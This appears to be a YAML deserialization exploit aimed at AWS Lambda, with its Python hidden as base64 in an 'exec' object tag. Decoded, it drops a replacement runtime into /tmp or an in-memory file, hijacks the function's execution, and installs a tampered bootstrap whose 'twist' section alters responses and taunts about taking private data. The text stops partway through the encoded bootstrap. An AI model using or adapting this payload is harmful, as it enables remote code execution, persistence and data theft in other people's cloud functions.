!!python/object/new:exec  [ "payload_b64 = b'aW1wb3J0IG9zCmltcG9ydCBjdHlwZXMgCmltcG9ydCBpbnNwZWN0CmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKCk1FTUZEX0NSRUFURV9TWVNDQUxMID0gMzE5CgojIERlY29kZSBuZXcgcnVudGltZQpuZXdfcnVudGltZSA9IGI2NGRlY29kZShleHRlcm5hbF9kYXRhX2I2NCkgIyBleHRlcm5hbF9kYXRhX2I2NCBpcyBkZWZpbmVkIGluIHRoZSB5YW1sIGZpbGUKCiMgV3JpdGUgdGhlIG5ldyBydW50aW1lIGludG8gYSBmaWxlIAppZiBvcy5hY2Nlc3MoIi90bXAiLCBvcy5XX09LKToKICAgIG5ld19ydW50aW1lX3BhdGggPSAiL3RtcC9uZXdfcnVudGltZSIKICAgIHdpdGggb3BlbihuZXdfcnVudGltZV9wYXRoLCAid2IiKSBhcyBmOgogICAgICAgIGYud3JpdGUobmV3X3J1bnRpbWUpCiAgICBvcy5jaG1vZChuZXdfcnVudGltZV9wYXRoLCAwbzc3NykKZWxzZToKICAgICMgSW4gY2FzZSAvdG1wIGlzIHJlYWQtb25seSwgY3JlYXRlIHRoZSBuZXcgcnVudGltZSBmaWxlIGluIG1lbW9yeSAKICAgIG1lbWZkID0gY3R5cGVzLkNETEwoTm9uZSkuc3lzY2FsbChNRU1GRF9DUkVBVEVfU1lTQ0FMTCwibmV3X3J1bnRpbWUiLCAwKSAKICAgIG9zLndyaXRlKG1lbWZkLCBuZXdfcnVudGltZSkKICAgIG5ld19ydW50aW1lX3BhdGggPSAiL3Byb2Mvc2VsZi9mZC8iICsgc3RyKG1lbWZkKQoKIyBHZXQgdGhlIGludm9rZSBpZCBmcm9tIHRoZSBfR0xPQkFMX0FXU19SRVFVRVNUX0lEIHZhcmlhYmxlIGluIGJvb3RzdHJhcC5weQppbnZva2VfaWQgPSBzdHIoaW5zcGVjdC5zdGFjaygpWy0yXVswXS5mX2dsb2JhbHNbIl9HTE9CQUxfQVdTX1JFUVVFU1RfSUQiXSkKCiMgRXhlYyB0aGUgbmV3IHJ1bnRpbWUKYXJncyA9IFtuZXdfcnVudGltZV9wYXRoLCBpbnZva2VfaWRdCm9zLmV4ZWN2cChuZXdfcnVudGltZV9wYXRoLCBhcmdzKQoKCgo='; external_data_b64 = b'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIiIiCkNvcHlyaWdodCAoYykgMjAxOCBBbWF6b24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuCiIiIgoKaW1wb3J0IGpzb24KaW1wb3J0IGxvZ2dpbmcKaW1wb3J0IG9zCmltcG9ydCBzaXRlCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHRyYWNlYmFjawppbXBvcnQgd2FybmluZ3MKCnN5cy5wYXRoLmluc2VydCgwLCAiL3Zhci9ydW50aW1lIikgIyBGb3IgbGFtYmRhIG1vZHVsZXMKCmZyb20gbGFtYmRhX3J1bnRpbWVfY2xpZW50IGltcG9ydCBMYW1iZGFSdW50aW1lQ2xpZW50CmZyb20gbGFtYmRhX3J1bnRpbWVfZXhjZXB0aW9uIGltcG9ydCBGYXVsdEV4Y2VwdGlvbgpmcm9tIGxhbWJkYV9ydW50aW1lX21hcnNoYWxsZXIgaW1wb3J0IHRvX2pzb24KCndpdGggd2FybmluZ3MuY2F0Y2hfd2FybmluZ3MoKToKICAgIHdhcm5pbmdzLmZpbHRlcndhcm5pbmdzKCJpZ25vcmUiLCBjYXRlZ29yeT1EZXByZWNhdGlvbldhcm5pbmcpCiAgICBpbXBvcnQgaW1wCgpFUlJPUl9MT0dfTElORV9URVJNSU5BVEUgPSAnXHInCkVSUk9SX0xPR19JREVOVCA9ICdcdTAwYTAnICAjIE5PLUJSRUFLIFNQQUNFIFUrMDBBMAoKCmRlZiBfZ2V0X2hhbmRsZXIoaGFuZGxlcik6CiAgICB0cnk6CiAgICAgICAgKG1vZG5hbWUsIGZuYW1lKSA9IGhhbmRsZXIucnNwbGl0KCcuJywgMSkKICAgIGV4Y2VwdCBWYWx1ZUVycm9yIGFzIGU6CiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5NQUxGT1JNRURfSEFORExFUl9OQU1FLCAiQmFkIGhhbmRsZXIgJ3t9Jzoge30iLmZvcm1hdChoYW5kbGVyLCBzdHIoZSkpKQogICAgICAgIHJldHVybiBtYWtlX2ZhdWx0X2hhbmRsZXIoZmF1bHQpCgogICAgZmlsZV9oYW5kbGUsIHBhdGhuYW1lLCBkZXNjID0gTm9uZSwgTm9uZSwgTm9uZQogICAgdHJ5OgogICAgICAgICMgUmVjdXJzaXZlbHkgbG9hZGluZyBoYW5kbGVyIGluIG5lc3RlZCBkaXJlY3RvcmllcwogICAgICAgIGZvciBzZWdtZW50IGluIG1vZG5hbWUuc3BsaXQoJy4nKToKICAgICAgICAgICAgaWYgcGF0aG5hbWUgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICBwYXRobmFtZSA9IFtwYXRobmFtZV0KICAgICAgICAgICAgZmlsZV9oYW5kbGUsIHBhdGhuYW1lLCBkZXNjID0gaW1wLmZpbmRfbW9kdWxlKHNlZ21lbnQsIHBhdGhuYW1lKQogICAgICAgIGlmIGZpbGVfaGFuZGxlIGlzIE5vbmU6CiAgICAgICAgICAgIG1vZHVsZV90eXBlID0gZGVzY1syXQogICAgICAgICAgICBpZiBtb2R1bGVfdHlwZSA9PSBpbXAuQ19CVUlMVElOOgogICAgICAgICAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5CVUlMVF9JTl9NT0RVTEVfQ09ORkxJQ1QsICJDYW5ub3QgdXNlIGJ1aWx0LWluIG1vZHVsZSB7fSBhcyBhIGhhbmRsZXIgbW9kdWxlIi5mb3JtYXQobW9kbmFtZSkpCiAgICAgICAgICAgICAgICByZXF1ZXN0X2hhbmRsZXIgPSBtYWtlX2ZhdWx0X2hhbmRsZXIoZmF1bHQpCiAgICAgICAgICAgICAgICByZXR1cm4gcmVxdWVzdF9oYW5kbGVyCiAgICAgICAgbSA9IGltcC5sb2FkX21vZHVsZShtb2RuYW1lLCBmaWxlX2hhbmRsZSwgcGF0aG5hbWUsIGRlc2MpCiAgICBleGNlcHQgSW1wb3J0RXJyb3IgYXMgZToKICAgICAgICBmYXVsdCA9IEZhdWx0RXhjZXB0aW9uKEZhdWx0RXhjZXB0aW9uLklNUE9SVF9NT0RVTEVfRVJST1IsICJVbmFibGUgdG8gaW1wb3J0IG1vZHVsZSAne30nOiB7fSIuZm9ybWF0KG1vZG5hbWUsIHN0cihlKSkpCiAgICAgICAgcmVxdWVzdF9oYW5kbGVyID0gbWFrZV9mYXVsdF9oYW5kbGVyKGZhdWx0KQogICAgICAgIHJldHVybiByZXF1ZXN0X2hhbmRsZXIKICAgIGV4Y2VwdCBTeW50YXhFcnJvciBhcyBlOgogICAgICAgIHRyYWNlID0gIkZpbGUgXCIlc1wiIExpbmUgJXNcblx0JXMiICUgKGUuZmlsZW5hbWUsIGUubGluZW5vLCBlLnRleHQpCiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5VU0VSX0NPREVfU1lOVEFYX0VSUk9SLCAiU3ludGF4IGVycm9yIGluIG1vZHVsZSAne30nOiB7fSIuZm9ybWF0KG1vZG5hbWUsIHN0cihlKSksIHRyYWNlKQogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IG1ha2VfZmF1bHRfaGFuZGxlcihmYXVsdCkKICAgICAgICByZXR1cm4gcmVxdWVzdF9oYW5kbGVyCiAgICBmaW5hbGx5OgogICAgICAgIGlmIGZpbGVfaGFuZGxlIGlzIG5vdCBOb25lOgogICAgICAgICAgICBmaWxlX2hhbmRsZS5jbG9zZSgpCgogICAgdHJ5OgogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IGdldGF0dHIobSwgZm5hbWUpCiAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5IQU5ETEVSX05PVF9GT1VORCwgIkhhbmRsZXIgJ3t9JyBtaXNzaW5nIG9uIG1vZHVsZSAne30nIi5mb3JtYXQoZm5hbWUsIG1vZG5hbWUpLCBOb25lKQogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IG1ha2VfZmF1bHRfaGFuZGxlcihmYXVsdCkKICAgIHJldHVybiByZXF1ZXN0X2hhbmRsZXIKCgpkZWYgbWFrZV9mYXVsdF9oYW5kbGVyKGZhdWx0KToKICAgIGRlZiByZXN1bHQoKmFyZ3MpOgogICAgICAgIHJhaXNlIGZhdWx0CgogICAgcmV0dXJuIHJlc3VsdAoKCmRlZiBtYWtlX2Vycm9yKGVycm9yX21lc3NhZ2UsIGVycm9yX3R5cGUsIHN0YWNrX3RyYWNlKToKICAgIHJlc3VsdCA9IHt9CiAgICBpZiBlcnJvcl9tZXNzYWdlOgogICAgICAgIHJlc3VsdFsnZXJyb3JNZXNzYWdlJ10gPSBlcnJvcl9tZXNzYWdlCiAgICBpZiBlcnJvcl90eXBlOgogICAgICAgIHJlc3VsdFsnZXJyb3JUeXBlJ10gPSBlcnJvcl90eXBlCiAgICBpZiBzdGFja190cmFjZToKICAgICAgICByZXN1bHRbJ3N0YWNrVHJhY2UnXSA9IHN0YWNrX3RyYWNlCiAgICByZXR1cm4gcmVzdWx0CgoKZGVmIHJlcGxhY2VfbGluZV9pbmRlbnRhdGlvbihsaW5lLCBpbmRlbnRfY2hhciwgbmV3X2luZGVudF9jaGFyKToKICAgIGlkZW50X2NoYXJzX2NvdW50ID0gMAogICAgZm9yIGMgaW4gbGluZToKICAgICAgICBpZiBjICE9IGluZGVudF9jaGFyOgogICAgICAgICAgICBicmVhawogICAgICAgIGlkZW50X2NoYXJzX2NvdW50ICs9IDEKICAgIHJldHVybiAobmV3X2luZGVudF9jaGFyICogaWRlbnRfY2hhcnNfY291bnQpICsgbGluZVtpZGVudF9jaGFyc19jb3VudDpdCgoKZGVmIGxvZ19lcnJvcihlcnJvcl9yZXN1bHQpOgogICAgZXJyb3JfZGVzY3JpcHRpb24gPSAiW0VSUk9SXSIKCiAgICBlcnJvcl9yZXN1bHRfdHlwZSA9IGVycm9yX3Jlc3VsdC5nZXQoJ2Vycm9yVHlwZScpCiAgICBpZiBlcnJvcl9yZXN1bHRfdHlwZToKICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiICIgKyBlcnJvcl9yZXN1bHRfdHlwZQoKICAgIGVycm9yX3Jlc3VsdF9tZXNzYWdlID0gZXJyb3JfcmVzdWx0LmdldCgnZXJyb3JNZXNzYWdlJykKICAgIGlmIGVycm9yX3Jlc3VsdF9tZXNzYWdlOgogICAgICAgIGlmIGVycm9yX3Jlc3VsdF90eXBlOgogICAgICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiOiIKICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiICIgKyBlcnJvcl9yZXN1bHRfbWVzc2FnZQoKICAgIGVycm9yX21lc3NhZ2VfbGluZXMgPSBbZXJyb3JfZGVzY3JpcHRpb25dCgogICAgc3RhY2tfdHJhY2UgPSBlcnJvcl9yZXN1bHQuZ2V0KCdzdGFja1RyYWNlJykKICAgIGlmIHN0YWNrX3RyYWNlIGlzIG5vdCBOb25lOgogICAgICAgIGVycm9yX21lc3NhZ2VfbGluZXMgKz0gWyJUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6Il0KICAgICAgICBmb3IgdHJhY2VfZWxlbWVudCBpbiBzdGFja190cmFjZToKICAgICAgICAgICAgaWYgdHJhY2VfZWxlbWVudCA9PSAiIjoKICAgICAgICAgICAgICAgIGVycm9yX21lc3NhZ2VfbGluZXMgKz0gWyIiXQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZm9yIHRyYWNlX2xpbmUgaW4gdHJhY2VfZWxlbWVudC5zcGxpdGxpbmVzKCk6CiAgICAgICAgICAgICAgICAgICAgZXJyb3JfbWVzc2FnZV9saW5lcyArPSBbcmVwbGFjZV9saW5lX2luZGVudGF0aW9uKHRyYWNlX2xpbmUsICcgJywgRVJST1JfTE9HX0lERU5UKV0KCiAgICBlcnJvcl9tZXNzYWdlID0gRVJST1JfTE9HX0xJTkVfVEVSTUlOQVRFLmpvaW4oZXJyb3JfbWVzc2FnZV9saW5lcykgKyAnXG4nCiAgICBzeXMuc3Rkb3V0LndyaXRlKGVycm9yX21lc3NhZ2UpCgoKCmRlZiBwYXJzZV9qc29uX2hlYWRlcihoZWFkZXIsIG5hbWUpOgogICAgdHJ5OgogICAgICAgIHJldHVybiBqc29uLmxvYWRzKGhlYWRlcikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByYWlzZSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5MQU1CREFfQ09OVEVYVF9VTk1BUlNIQUxfRVJST1IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVuYWJsZSB0byBwYXJzZSB7fSBKU09OOiB7fSIuZm9ybWF0KG5hbWUsIHN0cihlKSksIE5vbmUpCgoKZGVmIGNyZWF0ZV9sYW1iZGFfY29udGV4dChjbGllbnRfY29udGV4dF9qc29uLCBjb2duaXRvX2lkZW50aXR5X2pzb24sIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMsIGludm9rZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICBpbnZva2VkX2Z1bmN0aW9uX2Fybik6CiAgICBjbGllbnRfY29udGV4dCA9IE5vbmUKICAgIGlmIGNsaWVudF9jb250ZXh0X2pzb246CiAgICAgICAgY2xpZW50X2NvbnRleHQgPSBwYXJzZV9qc29uX2hlYWRlcihjbGllbnRfY29udGV4dF9qc29uLCAiQ2xpZW50IENvbnRleHQiKQogICAgY29nbml0b19pZGVudGl0eSA9IE5vbmUKICAgIGlmIGNvZ25pdG9faWRlbnRpdHlfanNvbjoKICAgICAgICBjb2duaXRvX2lkZW50aXR5ID0gcGFyc2VfanNvbl9oZWFkZXIoY29nbml0b19pZGVudGl0eV9qc29uLCAiQ29nbml0byBJZGVudGl0eSIpCiAgICByZXR1cm4gTGFtYmRhQ29udGV4dChpbnZva2VfaWQsIGNsaWVudF9jb250ZXh0LCBjb2duaXRvX2lkZW50aXR5LCBlcG9jaF9kZWFkbGluZV90aW1lX2luX21zLAogICAgICAgICAgICAgICAgICAgICAgICAgaW52b2tlZF9mdW5jdGlvbl9hcm4pCgoKZGVmIGJ1aWxkX2ZhdWx0X3Jlc3VsdChleGNfaW5mbywgbXNnKToKICAgIGV0eXBlLCB2YWx1ZSwgdGIgPSBleGNfaW5mbwogICAgdGJfdHVwbGVzID0gZXh0cmFjdF90cmFjZWJhY2sodGIpCiAgICBmb3IgaSBpbiByYW5nZShsZW4odGJfdHVwbGVzKSk6CiAgICAgICAgaWYgIi9ib290c3RyYXAucHkiIG5vdCBpbiB0Yl90dXBsZXNbaV1bMF06ICAjIGZpbGVuYW1lIG9mIHRoZSB0YiB0dXBsZQogICAgICAgICAgICB0Yl90dXBsZXMgPSB0Yl90dXBsZXNbaTpdCiAgICAgICAgICAgIGJyZWFrCgogICAgcmV0dXJuIG1ha2VfZXJyb3IobXNnIGlmIG1zZyBlbHNlIHN0cih2YWx1ZSksIGV0eXBlLl9fbmFtZV9fLCB0cmFjZWJhY2suZm9ybWF0X2xpc3QodGJfdHVwbGVzKSkKCgpkZWYgZXh0cmFjdF90cmFjZWJhY2sodGIpOgogICAgcmV0dXJuIFsoZnJhbWUuZmlsZW5hbWUsIGZyYW1lLmxpbmVubywgZnJhbWUubmFtZSwgZnJhbWUubGluZSkgZm9yIGZyYW1lIGluIHRyYWNlYmFjay5leHRyYWN0X3RiKHRiKV0KCgpjbGFzcyBDb2duaXRvSWRlbnRpdHkob2JqZWN0KToKICAgIF9fc2xvdHNfXyA9IFsiY29nbml0b19pZGVudGl0eV9pZCIsICJjb2duaXRvX2lkZW50aXR5X3Bvb2xfaWQiXQoKCmNsYXNzIENsaWVudChvYmplY3QpOgogICAgX19zbG90c19fID0gWyJpbnN0YWxsYXRpb25faWQiLCAiYXBwX3RpdGxlIiwgImFwcF92ZXJzaW9uX25hbWUiLCAiYXBwX3ZlcnNpb25fY29kZSIsICJhcHBfcGFja2FnZV9uYW1lIl0KCgpjbGFzcyBDbGllbnRDb250ZXh0KG9iamVjdCk6CiAgICBfX3Nsb3RzX18gPSBbJ2N1c3RvbScsICdlbnYnLCAnY2xpZW50J10KCgpkZWYgbWFrZV9vYmpfZnJvbV9kaWN0KF9jbGFzcywgX2RpY3QsIGZpZWxkcz1Ob25lKToKICAgIGlmIF9kaWN0IGlzIE5vbmU6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIG9iaiA9IF9jbGFzcygpCiAgICBzZXRfb2JqX2Zyb21fZGljdChvYmosIF9kaWN0KQogICAgcmV0dXJuIG9iagoKCmRlZiBzZXRfb2JqX2Zyb21fZGljdChvYmosIF9kaWN0LCBmaWVsZHM9Tm9uZSk6CiAgICBpZiBmaWVsZHMgaXMgTm9uZToKICAgICAgICBmaWVsZHMgPSBvYmouX19jbGFzc19fLl9fc2xvdHNfXwogICAgZm9yIGZpZWxkIGluIGZpZWxkczoKICAgICAgICBzZXRhdHRyKG9iaiwgZmllbGQsIF9kaWN0LmdldChmaWVsZCwgTm9uZSkpCgoKY2xhc3MgTGFtYmRhQ29udGV4dChvYmplY3QpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGludm9rZV9pZCwgY2xpZW50X2NvbnRleHQsIGNvZ25pdG9faWRlbnRpdHksIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMsCiAgICAgICAgICAgICAgICAgaW52b2tlZF9mdW5jdGlvbl9hcm49Tm9uZSk6CiAgICAgICAgc2VsZi5hd3NfcmVxdWVzdF9pZCA9IGludm9rZV9pZAogICAgICAgIHNlbGYubG9nX2dyb3VwX25hbWUgPSBvcy5lbnZpcm9uLmdldCgnQVdTX0xBTUJEQV9MT0dfR1JPVVBfTkFNRScpCiAgICAgICAgc2VsZi5sb2dfc3RyZWFtX25hbWUgPSBvcy5lbnZpcm9uLmdldCgnQVdTX0xBTUJEQV9MT0dfU1RSRUFNX05BTUUnKQogICAgICAgIHNlbGYuZnVuY3Rpb25fbmFtZSA9IG9zLmVudmlyb24uZ2V0KCJBV1NfTEFNQkRBX0ZVTkNUSU9OX05BTUUiKQogICAgICAgIHNlbGYubWVtb3J5X2xpbWl0X2luX21iID0gb3MuZW52aXJvbi5nZXQoJ0FXU19MQU1CREFfRlVOQ1RJT05fTUVNT1JZX1NJWkUnKQogICAgICAgIHNlbGYuZnVuY3Rpb25fdmVyc2lvbiA9IG9zLmVudmlyb24uZ2V0KCdBV1NfTEFNQkRBX0ZVTkNUSU9OX1ZFUlNJT04nKQogICAgICAgIHNlbGYuaW52b2tlZF9mdW5jdGlvbl9hcm4gPSBpbnZva2VkX2Z1bmN0aW9uX2FybgoKICAgICAgICBzZWxmLmNsaWVudF9jb250ZXh0ID0gbWFrZV9vYmpfZnJvbV9kaWN0KENsaWVudENvbnRleHQsIGNsaWVudF9jb250ZXh0KQogICAgICAgIGlmIHNlbGYuY2xpZW50X2NvbnRleHQgaXMgbm90IE5vbmU6CiAgICAgICAgICAgIHNlbGYuY2xpZW50X2NvbnRleHQuY2xpZW50ID0gbWFrZV9vYmpfZnJvbV9kaWN0KENsaWVudCwgc2VsZi5jbGllbnRfY29udGV4dC5jbGllbnQpCgogICAgICAgIHNlbGYuaWRlbnRpdHkgPSBtYWtlX29ial9mcm9tX2RpY3QoQ29nbml0b0lkZW50aXR5LCB7fSkKICAgICAgICBpZiBjb2duaXRvX2lkZW50aXR5IGlzIG5vdCBOb25lOgogICAgICAgICAgICBzZWxmLmlkZW50aXR5LmNvZ25pdG9faWRlbnRpdHlfaWQgPSBjb2duaXRvX2lkZW50aXR5LmdldCgiY29nbml0b0lkZW50aXR5SWQiKQogICAgICAgICAgICBzZWxmLmlkZW50aXR5LmNvZ25pdG9faWRlbnRpdHlfcG9vbF9pZCA9IGNvZ25pdG9faWRlbnRpdHkuZ2V0KCJjb2duaXRvSWRlbnRpdHlQb29sSWQiKQoKICAgICAgICBzZWxmLl9lcG9jaF9kZWFkbGluZV90aW1lX2luX21zID0gZXBvY2hfZGVhZGxpbmVfdGltZV9pbl9tcwoKICAgIGRlZiBnZXRfcmVtYWluaW5nX3RpbWVfaW5fbWlsbGlzKHNlbGYpOgogICAgICAgIGVwb2NoX25vd19pbl9tcyA9IGludCh0aW1lLnRpbWUoKSAqIDEwMDApCiAgICAgICAgZGVsdGFfbXMgPSBzZWxmLl9lcG9jaF9kZWFkbGluZV90aW1lX2luX21zIC0gZXBvY2hfbm93X2luX21zCiAgICAgICAgcmV0dXJuIGRlbHRhX21zIGlmIGRlbHRhX21zID4gMCBlbHNlIDAKCiAgICBkZWYgbG9nKHNlbGYsIG1zZyk6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShzdHIobXNnKSkKCgpjbGFzcyBMYW1iZGFMb2dnZXJIYW5kbGVyKGxvZ2dpbmcuSGFuZGxlcik6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgbG9nZ2luZy5IYW5kbGVyLl9faW5pdF9fKHNlbGYpCgogICAgZGVmIGVtaXQoc2VsZiwgcmVjb3JkKToKICAgICAgICBtc2cgPSBzZWxmLmZvcm1hdChyZWNvcmQpCiAgICAgICAgcHJpbnQobXNnKQoKCmNsYXNzIExhbWJkYUxvZ2dlckZpbHRlcihsb2dnaW5nLkZpbHRlcik6CiAgICBkZWYgZmlsdGVyKHNlbGYsIHJlY29yZCk6CiAgICAgICAgcmVjb3JkLmF3c19yZXF1ZXN0X2lkID0gX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCBvciAiIgogICAgICAgIHJldHVybiBUcnVlCgoKY2xhc3MgVW5idWZmZXJlZChvYmplY3QpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHN0cmVhbSk6CiAgICAgICAgc2VsZi5zdHJlYW0gPSBzdHJlYW0KCiAgICBkZWYgX19nZXRhdHRyX18oc2VsZiwgYXR0cik6CiAgICAgICAgcmV0dXJuIGdldGF0dHIoc2VsZi5zdHJlYW0sIGF0dHIpCgogICAgZGVmIHdyaXRlKHNlbGYsIG1zZyk6CiAgICAgICAgc2VsZi5zdHJlYW0ud3JpdGUobXNnKQogICAgICAgIHNlbGYuc3RyZWFtLmZsdXNoKCkKCiAgICBkZWYgd3JpdGVsaW5lcyhzZWxmLCBtc2dzKToKICAgICAgICBzZWxmLnN0cmVhbS53cml0ZWxpbmVzKG1zZ3MpCiAgICAgICAgc2VsZi5zdHJlYW0uZmx1c2goKQoKCmRlZiBpc19weXRob25wYXRoX3NldCgpOgogICAgcmV0dXJuICJQWVRIT05QQVRIIiBpbiBvcy5lbnZpcm9uCgoKZGVmIGdldF9vcHRfc2l0ZV9wYWNrYWdlc19kaXJlY3RvcnkoKToKICAgIHJldHVybiAnL29wdC9weXRob24vbGliL3B5dGhvbnt9Lnt9L3NpdGUtcGFja2FnZXMnLmZvcm1hdChzeXMudmVyc2lvbl9pbmZvLm1ham9yLCBzeXMudmVyc2lvbl9pbmZvLm1pbm9yKQoKCmRlZiBnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKToKICAgIHJldHVybiAnL29wdC9weXRob24nCgoKIyBzZXQgZGVmYXVsdCBzeXMucGF0aCBmb3IgZGlzY292ZXJhYmlsaXR5CiMgcHJlY2VkZW5jZTogL3Zhci90YXNrIC0+IC9vcHQvcHl0aG9uL2xpYi9weXRob25OLk4vc2l0ZS1wYWNrYWdlcyAtPiAvb3B0L3B5dGhvbgpkZWYgc2V0X2RlZmF1bHRfc3lzX3BhdGgoKToKICAgIGlmIG5vdCBpc19weXRob25wYXRoX3NldCgpOgogICAgICAgIHN5cy5wYXRoLmluc2VydCgwLCBnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKSkKICAgICAgICBzeXMucGF0aC5pbnNlcnQoMCwgZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgIyAnL3Zhci90YXNrJyBpcyBmdW5jdGlvbiBhdXRob3IncyB3b3JraW5nIGRpcmVjdG9yeQogICAgIyB3ZSBhZGQgaXQgZmlyc3QgaW4gb3JkZXIgdG8gbWltaWMgdGhlIGRlZmF1bHQgYmVoYXZpb3Igb2YgcG9wdWxhdGluZyBzeXMucGF0aCBhbmQgbWFrZSBtb2R1bGVzIHVuZGVyICcvdmFyL3Rhc2snCiAgICAjIGRpc2NvdmVyYWJsZSAtIGh0dHBzOi8vZG9jcy5weXRob24ub3JnLzMvbGlicmFyeS9zeXMuaHRtbCNzeXMucGF0aAogICAgc3lzLnBhdGguaW5zZXJ0KDAsIG9zLmVudmlyb25bJ0xBTUJEQV9UQVNLX1JPT1QnXSkKCgpkZWYgYWRkX2RlZmF1bHRfc2l0ZV9kaXJlY3RvcmllcygpOgogICAgIyBTZXQgJy92YXIvdGFzayBhcyBzaXRlIGRpcmVjdG9yeSBzbyB0aGF0IHdlIGFyZSBhYmxlIHRvIGxvYWQgYWxsIGN1c3RvbWVyIC5wdGggZmlsZXMKICAgIHNpdGUuYWRkc2l0ZWRpcihvcy5lbnZpcm9uWyJMQU1CREFfVEFTS19ST09UIl0pCiAgICBpZiBub3QgaXNfcHl0aG9ucGF0aF9zZXQoKToKICAgICAgICBzaXRlLmFkZHNpdGVkaXIoZ2V0X29wdF9zaXRlX3BhY2thZ2VzX2RpcmVjdG9yeSgpKQogICAgICAgIHNpdGUuYWRkc2l0ZWRpcihnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKSkKCgpkZWYgdXBkYXRlX3hyYXlfZW52X3ZhcmlhYmxlKHhyYXlfdHJhY2VfaWQpOgogICAgaWYgeHJheV90cmFjZV9pZCBpcyBub3QgTm9uZToKICAgICAgICBvcy5lbnZpcm9uWydfWF9BTVpOX1RSQUNFX0lEJ10gPSB4cmF5X3RyYWNlX2lkCiAgICBlbHNlOgogICAgICAgIGlmICdfWF9BTVpOX1RSQUNFX0lEJyBpbiBvcy5lbnZpcm9uOgogICAgICAgICAgICBkZWwgb3MuZW52aXJvblsnX1hfQU1aTl9UUkFDRV9JRCddCgoKZGVmIGluaXRfbG9nZ2VyKCk6CiAgICBsb2dnaW5nLkZvcm1hdHRlci5jb252ZXJ0ZXIgPSB0aW1lLmdtdGltZQogICAgbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoKQogICAgbG9nZ2VyX2hhbmRsZXIgPSBMYW1iZGFMb2dnZXJIYW5kbGVyKCkKICAgIGxvZ2dlcl9oYW5kbGVyLnNldEZvcm1hdHRlcihsb2dnaW5nLkZvcm1hdHRlcigKICAgICAgICAnWyUobGV2ZWxuYW1lKXNdXHQlKGFzY3RpbWUpcy4lKG1zZWNzKWRaXHQlKGF3c19yZXF1ZXN0X2lkKXNcdCUobWVzc2FnZSlzXG4nLAogICAgICAgICclWS0lbS0lZFQlSDolTTolUycKICAgICkpCiAgICBsb2dnZXJfaGFuZGxlci5hZGRGaWx0ZXIoTGFtYmRhTG9nZ2VyRmlsdGVyKCkpCiAgICBsb2dnZXIuYWRkSGFuZGxlcihsb2dnZXJfaGFuZGxlcikKCgoKIyMgLS0tIFR3aXN0IHJ1bnRpbWUgLS0tICMjCgp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMgIyB0d2lzdApleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKICAgIGZyb20gYm90b2NvcmUudmVuZG9yZWQgaW1wb3J0IHJlcXVlc3RzCgojIEFkZCBhIHNtYWxsIG5vdGlmaWNhdGlvbiB0byB0aGUgcmVzcG9uc2UKZGVmIHR3aXN0X3Jlc3BvbnNlKHJlc3BvbnNlKToKICAgIGlmIHR5cGUocmVzcG9uc2UpIGlzIG5vdCBkaWN0OgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgCiAgICBpZiAiYm9keSIgbm90IGluIHJlc3BvbnNlIG9yIG5vdCByZXNwb25zZVsiYm9keSJdOgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgYm9keSA9IHJlc3BvbnNlWyJib2R5Il0KICAgIAogICAgaWYgdHlwZShib2R5KSBpcyBub3QgZGljdDoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGpzb25fYm9keSA9IGpzb24ubG9hZHMoYm9keSkKICAgICAgICBleGNlcHQganNvbi5kZWNvZGVyLkpTT05EZWNvZGVFcnJvciBhcyBlOgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGVsc2U6CiAgICAgICAganNvbl9ib2R5ID0gYm9keQoKCiAgICBqc29uX2JvZHlbIkZZSSJdID0gIkknbGwgcHV0IHlvdXIgcHJpdmF0ZSBkYXRhIGludG8gZ29vZCB1c2UgKDsiCiAgICByZXNwb25zZVsiYm9keSJdID0ganNvbi5kdW1wcyhqc29uX2JvZHkpCiAgICByZXR1cm4gcmVzcG9uc2UKCgpkZWYgdHdpc3RfaGFuZGxlX2V2ZW50X3JlcXVlc3QobGFtYmRhX3J1bnRpbWVfY2xpZW50LCByZXF1ZXN0X2hhbmRsZXIsIGludm9rZV9pZCwgZXZlbnRfYm9keSwgY29udGVudF90eXBlLAogICAgICAgICAgICAgICAg